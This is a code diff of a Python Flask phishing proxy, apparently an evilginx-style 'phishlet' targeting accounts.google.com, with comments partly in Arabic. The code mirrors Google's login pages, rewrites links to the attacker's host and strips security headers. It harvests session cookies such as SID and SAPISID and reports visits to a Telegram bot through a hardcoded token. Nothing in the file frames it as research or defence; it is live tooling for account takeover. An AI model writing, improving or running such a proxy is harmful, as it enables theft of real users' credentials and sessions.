@@ -10,13 +10,12 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعدادات التيليجرام (يفضل استخدام متغيرات البيئة للأمان)
+# Telegram settings
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
 
 app = Flask(__name__, template_folder='templates')
 app.secret_key = os.urandom(32).hex()
-
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
 captured_sessions = {}
@@ -122,28 +121,16 @@ class PhishletEngine:
         return None
 
     def advanced_rewrite(self, content, content_type, current_host):
-        if not any(t in content_type for t in ['html', 'javascript', 'json']):
+        # تعديل بسيط: نستبدل فقط نطاق الهدف
+        if not any(t in content_type for t in ['html', 'javascript', 'text']):
             return content
         try:
             decoded = content.decode('utf-8', errors='ignore')
-            target_pattern = self.target_domain.replace('.', r'\.')
-            decoded = re.sub(
-                rf'(https?:)?(//)?([a-zA-Z0-9.-]+\.)?{target_pattern}',
-                f'https://{current_host}',
-                decoded,
-                flags=re.IGNORECASE
-            )
-            decoded = re.sub(r'\bintegrity="[^"]*"', '', decoded, flags=re.IGNORECASE)
-            decoded = re.sub(r'<meta[^>]*http-equiv=["\']Content-Security-Policy["\'][^>]*>', '', decoded, flags=re.IGNORECASE)
-            if 'html' in content_type:
-                soup = BeautifulSoup(decoded, 'html.parser')
-                for tag in soup.find_all(['script', 'link', 'img', 'a', 'form'], src=True):
-                    if tag.get('src') and self.target_domain in tag['src']:
-                        tag['src'] = tag['src'].replace(f"https://{self.target_domain}", f"https://{current_host}")
-                for tag in soup.find_all(['a', 'form'], href=True):
-                    if tag.get('href') and self.target_domain in tag['href']:
-                        tag['href'] = tag['href'].replace(f"https://{self.target_domain}", f"https://{current_host}")
-                decoded = str(soup)
+            # استبدال كل الروابط التي تحتوي على target_domain
+            decoded = decoded.replace(self.target_domain, current_host)
+            # أيضًا استبدال الروابط المطلقة
+            decoded = decoded.replace(f"https://{self.target_domain}", f"https://{current_host}")
+            decoded = decoded.replace(f"http://{self.target_domain}", f"https://{current_host}")
             return decoded.encode('utf-8')
         except Exception as e:
             logging.error(f"Rewrite error: {e}")
@@ -152,12 +139,7 @@ class PhishletEngine:
 phishlet = PhishletEngine(
     name='Google',
     target_domain='accounts.google.com',
-    proxy_hosts=[
-        {'phish_sub': 'accounts', 'orig_sub': 'accounts', 'domain': 'google.com'},
-        {'phish_sub': 'myaccount', 'orig_sub': 'myaccount', 'domain': 'google.com'},
-        {'phish_sub': 'mail', 'orig_sub': 'mail', 'domain': 'google.com'},
-        {'phish_sub': 'www', 'orig_sub': 'www', 'domain': 'google.com'}
-    ],
+    proxy_hosts=[],  # لا نحتاجها الآن
     auth_tokens=[
         'SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
         '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token'
@@ -172,17 +154,15 @@ phishlet = PhishletEngine(
     ]
 )
 
-# إشعار الزيارة مع منع التكرار باستخدام كوكي (تم التصحيح هنا)
 @app.before_request
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
         phishlet.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
         @after_this_request
         def set_visit_cookie(response):
-            response.set_cookie('visited', '1', max_age=3600)  # ساعة واحدة
+            response.set_cookie('visited', '1', max_age=3600)
             return response
 
-# المسارات الإدارية
 @app.route('/admin/dashboard')
 def admin_dashboard():
     try:
@@ -227,8 +207,11 @@ def proxy(path):
     host = request.headers.get('Host', '').split(':')[0]
     engine = phishlet
 
+    # بناء URL الهدف
     target_url = f"https://{engine.target_domain}/{path}"
+    logging.info(f"Proxying {request.method} {path} to {target_url}")
 
+    # إعداد الرؤوس
     headers = {}
     for k, v in request.headers:
         if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']:
@@ -253,25 +236,30 @@ def proxy(path):
             timeout=30
         )
 
+        # إعادة كتابة المحتوى
         content = engine.advanced_rewrite(resp.content, resp.headers.get('Content-Type', ''), host)
         proxy_resp = make_response(content)
         proxy_resp.status_code = resp.status_code
 
+        # نسخ الرؤوس
         excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
                             'strict-transport-security', 'content-security-policy']
         for n, v in resp.headers.items():
             if n.lower() not in excluded_headers:
                 proxy_resp.headers[n] = v
 
+        # نقل الكوكيز
         for cookie_name, cookie_value in resp.cookies.items():
             proxy_resp.set_cookie(
                 cookie_name, cookie_value,
                 domain=host, secure=True, httponly=True, samesite='Lax'
             )
 
+        # التقاط الجلسة إذا وجدت
         if resp.cookies:
             engine.capture_full_session(resp.cookies, host, captured_creds_data)
 
+        # تعديل التوجيه
         if 'Location' in proxy_resp.headers:
             location = proxy_resp.headers['Location']
             new_location = location.replace(engine.target_domain, host)
